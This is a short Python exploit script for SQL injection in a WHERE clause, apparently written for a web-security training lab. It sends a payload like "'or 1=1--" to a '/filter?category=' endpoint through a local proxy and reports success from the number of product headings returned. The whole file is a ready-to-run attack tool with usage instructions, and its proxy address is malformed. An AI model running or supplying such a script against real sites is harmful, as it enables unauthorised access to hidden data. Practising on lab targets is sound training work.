#SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

import sys, urllib3, requests
from bs4 import BeautifulSoup as bs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_sqli(url,payload):
    uri = "/filter?category="
    proxies = {'http' : 'http://127.0.0.0/:8080', 'https' : 'http://127.0.0.1:8080'}
    r = requests.get(url + uri + payload, verify = False, proxies=proxies)
    soup = bs(r.text,features="lxml")
    if(len(soup.find_all('h3')) > 12):
        return True
    else:
        return False

if __name__ == '__main__':
    try:
        
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
        
        
    except:
        print(
        f'''\t---------------------------------------------------------------
            Getting trouble??
            Here is how you can run this exploit!

            [-] usage:      python3 {sys.argv[0]} <url> <payload>
            [-] example:    python3 {sys.argv[0]} www.example.com "'or 1=1--"
        ---------------------------------------------------------------
            ''')
        exit(-1)
    
    
if(exploit_sqli(url,payload)):
    print("[+]" '\033[32m' + "SQL injection attack successful" + '\033[0m')
else:
    print("[+]" + '\033[31m' + "SQL injection attack unsuccessful" + '\033[0m')
